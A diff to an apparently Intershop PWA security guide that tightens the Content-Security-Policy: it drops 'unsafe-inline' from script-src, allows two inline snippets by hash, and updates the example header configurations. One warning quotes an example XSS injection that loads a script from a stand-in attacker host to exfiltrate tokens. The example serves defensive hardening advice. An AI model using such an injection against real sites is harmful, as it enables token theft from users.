@@ -11,6 +11,7 @@ kb_sync_latest_only
 - [Header Management Locations](#header-management-locations)
 - [Shipped Default Headers](#shipped-default-headers)
   - [Rationale for the Permissive Defaults](#rationale-for-the-permissive-defaults)
+  - [Inline Scripts in the PWA](#inline-scripts-in-the-pwa)
   - [The First Step Against XSS: Adjust `script-src`](#the-first-step-against-xss-adjust-script-src)
 - [Header Configuration](#header-configuration)
   - [Source Resolution and Precedence](#source-resolution-and-precedence)
@@ -45,7 +46,8 @@ The standard PWA ships a secure-by-default, yet deliberately permissive, baselin
 
 The default policy intentionally allows `https:` sources so that a typical storefront using third-party analytics, payment providers, or a CDN keeps working out of the box, while vulnerability scanners still see the required headers.
 
-- `'unsafe-inline'` is kept for `script-src` and `style-src` because the PWA and common integrations (e.g., tag managers) rely on inline scripts and styles.
+- `'unsafe-inline'` is **not** allowed for `script-src`, so injected inline scripts, inline event handlers, and `javascript:` URLs are blocked (see [Inline Scripts in the PWA](#inline-scripts-in-the-pwa)).
+- `'unsafe-inline'` is kept for `style-src` because the PWA and Bootstrap rely on inline styles.
 - `'unsafe-eval'` for `script-src` is not included, because the PWA production build does not require it.
   Features that evaluate strings at runtime are blocked, e.g.:
   - Formly string expressions: Use function expressions instead (see [Formly](./formly.md#formlyfieldconfig)).
@@ -56,37 +58,66 @@ The default policy intentionally allows `https:` sources so that a typical store
 
 > [!IMPORTANT]
 > The permissive defaults are a baseline that prevents storefronts from breaking, **not** a PCI DSS 4.0-compliant policy.
-> For payment pages, tighten the policy to explicit origins and **remove** `'unsafe-inline'`.
+> For payment pages, tighten the policy to explicit origins.
 > See [Hardening for PCI DSS 4.0](#hardening-for-pci-dss-40).
+
+### Inline Scripts in the PWA
+
+Without `'unsafe-inline'`, the browser only executes inline code that is explicitly allowed by its hash.
+The default `script-src` allows exactly two inline snippets of the PWA:
+
+| Hash                                                                    | Inline code                                                                                                                                                                   |
+| ----------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `'sha256-dW0eELjdgTmSUdeaPS5Zj/GeIqiLQLyr/kqEzI27EjA='`                 | The cookie banner script in [_index.html_](../../src/index.html) that shows the server-side rendered banner before hydration.                                                 |
+| `'unsafe-hashes' 'sha256-MhtPZXr7+LpJUY5qtMutB+qWfQtMaPccfe7QXtCcEYc='` | The `onload="this.media='all'"` handler that the critical CSS inlining of the production build adds to the stylesheet link; without it, the main stylesheet is never applied. |
+
+> [!NOTE]
+> The `onload` handler is only generated for builds without a deploy URL, e.g., `npm run build`.
+> The standard Docker image is built with `--deploy-url=DEPLOY_URL_PLACEHOLDER`, which skips the critical CSS inlining, so no `onload` handler is generated.
+> The `'unsafe-hashes'` entry and its hash are kept as a harmless fallback, because they allow exactly this handler only.
+
+The hash covers the exact script content, including whitespace.
+Whenever you change the inline script in _index.html_ (or add another one), update the hash in [_additional-headers.yaml_](../../nginx/additional-headers.yaml).
+The unit test [_content-security-policy.spec.ts_](../../src/content-security-policy.spec.ts) fails if the hashes do not match, and the browser console reports the expected hash of every blocked inline script.
+
+A nonce cannot be used instead, because the headers are static and NGINX caches the rendered pages, so every visitor would receive the same nonce.
+
+Custom code has to follow the same rules:
+
+- Use Angular event bindings, e.g., `(click)`, instead of inline event handlers or `javascript:` URLs.
+  For printing, use the `ishPrintPage` directive.
+- In HTML rendered with `ishServerHtml` (e.g., translations or CMS content), use `callback` attributes instead of `javascript:` URLs, e.g., `<a href="#" role="button" callback="reloadPage">`.
+  The callbacks `reloadPage` and `navigateBack` are always available; further callbacks can be passed via the `callbacks` input.
+- Load third-party scripts from their origin instead of inlining them.
+  Google Tag Manager "Custom HTML" tags are inline scripts and are blocked; use tag templates instead.
 
 ### The First Step Against XSS: Adjust `script-src`
 
 > [!WARNING]
-> As long as `script-src` contains `'unsafe-inline'`, the CSP provides **no protection against inline-script XSS**.
+> If `script-src` contains `'unsafe-inline'` (without any hash or nonce), the CSP provides **no protection against inline-script XSS**.
 > Injected `<script>...</script>` blocks, `javascript:` URLs, and inline event handlers (`onerror`, `onload`, `onclick`, and every `on*` attribute) all still execute.
-> The single most effective hardening step is to **remove `'unsafe-inline'` from `script-src`**.
+> Do not re-add `'unsafe-inline'` to `script-src`.
 
-The shipped default keeps `'unsafe-inline'` only so that storefronts and integrations that still rely on inline scripts do not break out of the box.
-Once your project no longer depends on inline scripts, drop `'unsafe-inline'` **and** the broad `https:` source from `script-src`:
+The shipped default already blocks inline scripts, but it still allows external scripts from any HTTPS origin.
+Once you know the script origins of your project, drop the broad `https:` source from `script-src`:
 
 ```text
-# permissive default (inline XSS NOT blocked; external scripts from ANY HTTPS host allowed)
-script-src 'self' 'unsafe-inline' https:;
+# shipped default (inline XSS blocked; external scripts from ANY HTTPS host allowed)
+script-src 'self' https: 'sha256-dW0eELjdgTmSUdeaPS5Zj/GeIqiLQLyr/kqEzI27EjA=' 'unsafe-hashes' 'sha256-MhtPZXr7+LpJUY5qtMutB+qWfQtMaPccfe7QXtCcEYc=';
 
 # hardened (inline XSS blocked; only same-origin scripts allowed)
-script-src 'self';
+script-src 'self' 'sha256-dW0eELjdgTmSUdeaPS5Zj/GeIqiLQLyr/kqEzI27EjA=' 'unsafe-hashes' 'sha256-MhtPZXr7+LpJUY5qtMutB+qWfQtMaPccfe7QXtCcEYc=';
 ```
 
 > [!WARNING]
-> Removing `'unsafe-inline'` is only half the job: the bare `https:` in `script-src` trusts **every** HTTPS origin for scripts.
+> The bare `https:` in `script-src` trusts **every** HTTPS origin for scripts.
 > An attacker who can inject HTML can then load an external script from any host they control, for example `<script src="https://attacker.example/evil.js"></script>`, and the browser will fetch and execute it, allowing it to read and exfiltrate tokens.
 > Drop the bare `https:` and list only the specific script origins you trust.
 
-Allow specific third-party scripts by adding their explicit origins (see [Common Third-Party Scenarios](#common-third-party-scenarios)) or a per-request nonce/hash — but never by re-adding `'unsafe-inline'` or a bare `https:`.
+Allow specific third-party scripts by adding their explicit origins (see [Common Third-Party Scenarios](#common-third-party-scenarios)) or a hash — but never by re-adding `'unsafe-inline'` or a bare `https:`.
 
 > [!NOTE]
 > `'unsafe-inline'` in `style-src` is far less dangerous than in `script-src` and is often kept, because the PWA and Bootstrap rely on inline styles.
-> Prioritize removing it from `script-src` first.
 
 ## Header Configuration
 
@@ -137,7 +168,7 @@ nginx:
   environment:
     ADDITIONAL_HEADERS: |
       headers:
-        - Content-Security-Policy: "default-src 'self' https://your-icm-host; script-src 'self' https://www.googletagmanager.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' https://www.google-analytics.com; frame-src 'self' https://secure.pay1.de; base-uri 'self'; object-src 'none'; frame-ancestors 'self' https://your-icm-host;"
+        - Content-Security-Policy: "default-src 'self' https://your-icm-host; script-src 'self' https://www.googletagmanager.com 'sha256-dW0eELjdgTmSUdeaPS5Zj/GeIqiLQLyr/kqEzI27EjA=' 'unsafe-hashes' 'sha256-MhtPZXr7+LpJUY5qtMutB+qWfQtMaPccfe7QXtCcEYc='; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' https://www.google-analytics.com; frame-src 'self' https://secure.pay1.de; base-uri 'self'; object-src 'none'; frame-ancestors 'self' https://your-icm-host;"
         - X-Content-Type-Options: 'nosniff'
         - Referrer-Policy: 'strict-origin-when-cross-origin'
         - Permissions-Policy: 'camera=(), microphone=(), geolocation=(self)'
@@ -150,7 +181,7 @@ nginx:
 cache:
   additionalHeaders: |
     headers:
-      - Content-Security-Policy: "default-src 'self' https://your-icm-host; style-src 'self' 'unsafe-inline'; font-src 'self' data:; object-src 'none';"
+      - Content-Security-Policy: "default-src 'self' https://your-icm-host; script-src 'self' 'sha256-dW0eELjdgTmSUdeaPS5Zj/GeIqiLQLyr/kqEzI27EjA=' 'unsafe-hashes' 'sha256-MhtPZXr7+LpJUY5qtMutB+qWfQtMaPccfe7QXtCcEYc='; style-src 'self' 'unsafe-inline'; font-src 'self' data:; object-src 'none';"
       - X-Content-Type-Options: 'nosniff'
 ```
 
@@ -167,7 +198,7 @@ nginx:
     ADDITIONAL_HEADERS: |
       headers:
         # keep the defaults you still want ...
-        - Content-Security-Policy: "default-src 'self' https:; script-src 'self' 'unsafe-inline' https:; style-src 'self' 'unsafe-inline' https:; img-src 'self' data: blob: https:; font-src 'self' data: https:; connect-src 'self' https:; frame-src 'self' https:; child-src 'self' blob: https:; worker-src 'self' blob:; form-action 'self' https:; base-uri 'self'; object-src 'none';"
+        - Content-Security-Policy: "default-src 'self' https:; script-src 'self' https: 'sha256-dW0eELjdgTmSUdeaPS5Zj/GeIqiLQLyr/kqEzI27EjA=' 'unsafe-hashes' 'sha256-MhtPZXr7+LpJUY5qtMutB+qWfQtMaPccfe7QXtCcEYc='; style-src 'self' 'unsafe-inline' https:; img-src 'self' data: blob: https:; font-src 'self' data: https:; connect-src 'self' https:; frame-src 'self' https:; child-src 'self' blob: https:; worker-src 'self' blob:; form-action 'self' https:; base-uri 'self'; object-src 'none';"
         - X-Content-Type-Options: 'nosniff'
         - Referrer-Policy: 'strict-origin-when-cross-origin'
         - Permissions-Policy: 'camera=(), microphone=(), geolocation=(self)'
@@ -206,7 +237,7 @@ When extending the PWA, identify **all** origins a resource loads from (using br
 Example CSP fragment that adds Google Tag Manager to a locked-down policy:
 
 ```
-Content-Security-Policy: "default-src 'self'; script-src 'self' https://www.googletagmanager.com; connect-src 'self' https://www.google-analytics.com https://analytics.google.com; img-src 'self' data: https://www.google-analytics.com; style-src 'self' 'unsafe-inline'; font-src 'self' https://fonts.gstatic.com;"
+Content-Security-Policy: "default-src 'self'; script-src 'self' https://www.googletagmanager.com 'sha256-dW0eELjdgTmSUdeaPS5Zj/GeIqiLQLyr/kqEzI27EjA=' 'unsafe-hashes' 'sha256-MhtPZXr7+LpJUY5qtMutB+qWfQtMaPccfe7QXtCcEYc='; connect-src 'self' https://www.google-analytics.com https://analytics.google.com; img-src 'self' data: https://www.google-analytics.com; style-src 'self' 'unsafe-inline'; font-src 'self' https://fonts.gstatic.com;"
 ```
 
 ## Hardening for PCI DSS 4.0
